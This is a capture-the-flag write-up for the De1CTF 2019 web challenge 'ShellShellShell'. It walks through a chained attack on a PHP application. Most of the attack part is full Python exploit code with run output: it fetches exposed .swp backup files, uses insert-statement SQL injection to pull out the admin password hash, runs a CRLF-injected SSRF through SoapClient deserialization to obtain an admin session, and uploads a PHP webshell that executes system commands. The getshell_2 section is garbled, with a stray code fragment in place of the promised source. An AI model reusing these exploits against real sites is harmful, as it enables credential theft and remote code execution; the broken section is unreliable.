[中文](./README_zh.md) [English](./README.md)

[dockerfile](./dockerfile)

# ShellShellShell

### overview

It required the exploitation of several bugs in order to reach the  flag, so
let's start with an overview.

- Backup files (example:`.index.php.swp`)  
- INSERT SQLi in publish functionality to exfiltrate admin credentials through un/serialized PHP object  
- SSRF (CRLF injection) through unsafe object deserialization to "bypass" `$_SERVER['REMOTE_ADDR'] === '127.0.0.1'` condition and get authenticated admin session  
- Upload file and getshell.  
- Find another server in the inside net (IP:172.18.0.2) and get flag on it.

### Get source code  
`GetSwp.py`

```  
#coding=utf-8  
# import requests  
import urllib  
import os  
os.system('mkdir source')  
os.system('mkdir source/views')  
file_list=['.index.php.swp','.config.php.swp','.user.php.swp','user.php.bak','views/.delete.swp','views/.index.swp','views/.login.swp','views/.logout.swp','views/.profile.swp','views/.publish.swp','views/.register.swp']  
part_url='http://45.76.187.90:11027/'  
for i in file_list:  
   url=part_url+i  
   print 'download %s '% url  
   os.system('curl '+url+'>source/'+i)

```

### sql injection

Lootint at the `user.php` and the `insert` function.

```php  
private function get_column($columns){  
       if(is_array($columns))  
           $column = ' `'.implode('`,`',$columns).'` ';  
       else  
           $column = ' `'.$columns.'` ';  
       return $column;  
   }  
public function insert($columns,$table,$values){  
       $column = $this->get_column($columns);  
       $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';  
       $nid =  
       $sql = 'insert into '.$table.'('.$column.') values '.$value;  
       $result = $this->conn->query($sql);  
       return $result;  
   }  
```

We can use a common SQLi payload for insert statements but in order to cope
with the `preg_replace`, we must use backticks (`` ` ``) in place of single
quotes (`'`). So, sending the following payload:

```  
mood=0&signature=a`, `mood`); -- -  
```

will result in the following MySQL query:

```  
insert into ctf_user_signature( `userid`,`username`,`signature`,`mood` )  
values ( '1','foo','a', 'mood'); -- -`,'0' )  
```

#### `sql_exp.py`

Use `sql_exp.py` to get admin hash.

```  
#coding=utf-8  
import re  
import string  
import random  
import requests  
import subprocess  
import hashlib  
from itertools import product

_target='http://20.20.20.128:11027/index.php?action='

def get_code_dict():  
   c =
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_
[]{}<>~`+=,.;:/?|'  
   captchas = [''.join(i) for i in product(c, repeat=3)]

   print '[+] Genering {} captchas...'.format(len(captchas))  
   with open('captchas.txt', 'w') as f:  
       for k in captchas:  
           f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\n')

def get_creds():  
   username = ''.join(random.choice(string.ascii_lowercase + string.digits)
for _ in range(10))  
   password = ''.join(random.choice(string.ascii_lowercase + string.digits)
for _ in range(10))  
   return username, password

def solve_code(html):  
   code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)',
html).group(1)  
   solution = subprocess.check_output(['grep', '^'+code,
'captchas.txt']).split()[2]  
   return solution

def register(username, password):  
   resp = sess.get(_target+'register')  
   code = solve_code(resp.text)  
sess.post(_target+'register',
data={'username':username,'password':password,'code':code})  
   return True

def login(username, password):  
   resp = sess.get(_target+'login')  
   code = solve_code(resp.text)  
sess.post(_target+'login',
data={'username':username,'password':password,'code':code})  
   return True

def publish(sig, mood):  
   return sess.post(_target+'publish', data={'signature':sig,'mood':mood})

get_code_dict()

sess = requests.Session()  
username, password = get_creds()  
print '[+] register({}, {})'.format(username, password)  
register(username, password)  
print '[+] login({}, {})'.format(username, password)  
login(username, password)  
print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

for i in range(1,33): # we know password is 32 chars (md5)  
   mood = '(select
concat(`O:4:\"Mood\":3:{{s:4:\"mood\";i:`,ord(substr(password,{},1)),`;s:2:\"ip\";s:14:\"80.212.199.161\";s:4:\"date\";i:1520664478;}}`)
from ctf_users where is_admin=1 limit 1)'.format(i)  
   payload = 'a`, {}); -- -'.format(mood)  
   resp = publish(payload, '0')

resp = sess.get(_target+'index')  
moods = re.findall(r'img/([0-9]+)\.gif', resp.text)[::-1] # last publish will
be read first in the html  
admin_hash = ''.join(map(lambda k: chr(int(k)), moods))

print '[+] admin hash => ' + admin_hash

```

```  
root@kali64:~# python sql_exp.py  
[+] Genering 778688 captchas...  
[+] register(cvnyshokxj, sjt0ayo3c1)  
[+] login(cvnyshokxj, sjt0ayo3c1)  
[+] user session => 7fublips3949q8vcs611fcdha2  
[+] admin hash => c991707fdf339958eded91331fb11ba0  
```

After decryption,we get admin's password `jaivypassword`.

### getshell_1

#### ssrf_crlf_getshell_exp.py

```  
import re  
import sys  
import string  
import random  
import requests  
import subprocess  
from itertools import product  
import hashlib  
from itertools import product

_target = 'http://20.20.20.128:11027/'  
_action = _target + 'index.php?action='

def get_code_dict():  
   c =
'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_
[]{}<>~`+=,.;:/?|'  
   captchas = [''.join(i) for i in product(c, repeat=3)]

   print '[+] Genering {} captchas...'.format(len(captchas))  
   with open('captchas.txt', 'w') as f:  
       for k in captchas:  
           f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\n')

def get_creds():  
   username = ''.join(random.choice(string.ascii_lowercase + string.digits)
for _ in range(10))  
   password = ''.join(random.choice(string.ascii_lowercase + string.digits)
for _ in range(10))  
   return username, password

#code  
def solve_code(html):  
   code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)',
html).group(1)  
   solution = subprocess.check_output(['grep', '^'+code,
'captchas.txt']).split()[2]  
   return solution

def register(username, password):  
   resp = sess.get(_action+'register')  
   code = solve_code(resp.text)  
sess.post(_action+'register',
data={'username':username,'password':password,'code':code})  
   return True

def login(username, password):  
   resp = sess.get(_action+'login')  
   code = solve_code(resp.text)  
sess.post(_action+'login',
data={'username':username,'password':password,'code':code})  
   return True

def publish(sig, mood):  
   return sess.post(_action+'publish', data={'signature':sig,'mood':mood})#,
proxies={'http':'127.0.0.1:8080'})

def get_prc_now():  
   # date_default_timezone_set("PRC") is not important  
   return subprocess.check_output(['php', '-r',
'date_default_timezone_set("PRC"); echo time();'])

def get_admin_session():  
   sess = requests.Session()  
   resp = sess.get(_action+'login')  
   code = solve_code(resp.text)  
   return sess.cookies.get_dict()['PHPSESSID'], code

get_code_dict()

print '[+] creating user session to trigger ssrf'  
sess = requests.Session()

username, password = get_creds()

print '[+] register({}, {})'.format(username, password)  
register(username, password)

print '[+] login({}, {})'.format(username, password)  
login(username, password)

print '[+] user session => ' + sess.cookies.get_dict()['PHPSESSID']

print '[+] getting fresh session to be authenticated as admin'  
phpsessid, code = get_admin_session()

ssrf = 'http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST
/index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie:
PHPSESSID={}\x0d\x0aContent-Type: application/x-www-form-
urlencoded\x0d\x0aContent-Length:
200\x0d\x0a\x0d\x0ausername=admin&password=jaivypassword&code={}&\x0d\x0a\x0d\x0aPOST
/foo\x0d\x0a'.format(phpsessid, code)  
mood =
'O:10:\"SoapClient\":4:{{s:3:\"uri\";s:{}:\"{}\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;}}'.format(len(ssrf),
ssrf)  
mood = '0x'+''.join(map(lambda k: hex(ord(k))[2:].rjust(2, '0'), mood))

payload = 'a`, {}); -- -'.format(mood)

print '[+] final sqli/ssrf payload: ' + payload

print '[+] injecting payload through sqli'  
resp = publish(payload, '0')

print '[+] triggering object deserialization -> ssrf'  
sess.get(_action+'index')#, proxies={'http':'127.0.0.1:8080'})

print '[+] admin session => ' + phpsessid

# switching to admin session  
sess = requests.Session()  
sess.cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': phpsessid})

# resp = sess.post(_action+'publish')  
# print resp.text

print '[+] uploading stager'  
shell = {'pic': ('jaivy.php', '', 'image/jpeg')}  
resp = sess.post(_action+'publish', files=shell)  
# print resp.text  
webshell_url=_target+'upload/jaivy.php'  
print '[+] shell => '+webshell_url+'\n'

post_data={"jaivy":"system('ls -al');"}  
resp = sess.post(url=webshell_url,data=post_data)  
print resp.text

```

```  
root@kali64:~# python ssrf_crlf_getshell_exp.py  
[+] Genering 778688 captchas...  
[+] creating user session to trigger ssrf  
[+] register(a6skt6cjpr, rw2dz23fjv)  
[+] login(a6skt6cjpr, rw2dz23fjv)  
[+] user session => b4sd5q2jtb0tlh4lmqoj4mcb92  
[+] getting fresh session to be authenticated as admin  
[+] final sqli/ssrf payload: a`,
0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a3237373a22687474703a2f2f3132372e302e302e312f0d0a436f6e74656e742d4c656e6774683a300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d706f633672616771686d6e686933636e6e737136636a666332340d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a203230300d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d4a3165260d0a0d0a504f5354202f666f6f0d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31333a225f736f61705f76657273696f6e223b693a313b7d);
-- -  
[+] injecting payload through sqli  
[+] triggering object deserialization -> ssrf  
[+] admin session => poc6ragqhmnhi3cnnsq6cjfc24  
[+] uploading stager  
[+] shell => http://20.20.20.128:11027/upload/jaivy.php

total 12  
drwxrwxrwx 1 root     root     4096 Aug  5 18:07 .  
drwxr-xr-x 1 root     root     4096 Aug  5 18:03 ..  
-rw-r--r-- 1 www-data www-data   29 Aug  5 18:07 jaivy.php

root@kali64:~#  
```

### getshell_2

After that,we can find an another server in the inside net ,which IP is
`172.18.0.2` .and the website source is :

```  
0:  
       print(resp,i)  
       break

```

We can use this command to find the location of the flag file.

```  
find / -name "*flag*"  
```

Original writeup (https://github.com/De1ta-
team/De1CTF2019/tree/master/writeup/web/ShellShellShell).